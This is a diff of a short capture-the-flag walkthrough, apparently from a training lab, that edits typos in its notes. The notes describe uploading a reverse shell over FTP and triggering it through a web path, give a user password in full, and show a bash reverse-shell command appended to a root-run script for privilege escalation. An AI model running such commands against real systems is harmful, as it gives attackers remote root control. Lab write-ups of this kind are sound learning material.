@@ -49,10 +49,9 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel.
 
 ```
 
-In ftp has something important and notice wia gobuster subdir `files` and nootice it has ftp files in parent dir so i put reverse shell to ftp and move to ftp dir and run it wia web browser and get reverse shell and find first recipe in shell 
+In ftp has something important and notice wia gobuster subdir `files` and notice it has ftp files in parent dir so i put reverse shell to ftp and move to ftp dir and run it wia web browser and get reverse shell and find first recipe in shell 
 
-`c4ntg3t3n0ughsp1c3` using this pwd login as a sudo lennie,........
-
+`c4ntg3t3n0ughsp1c3` using this pwd login as a sudo lennie,.
 after running linum.sh find root running sh so i put bash reverse shell into this 
 
 ```
@@ -60,4 +59,4 @@ echo "bash -i >& /dev/tcp/10.9.0.218/8888 0>&1" >> /etc/print.sh
 
 ```
 
-and after excutable, i got root shell
+and after excutable, i got root shell...............
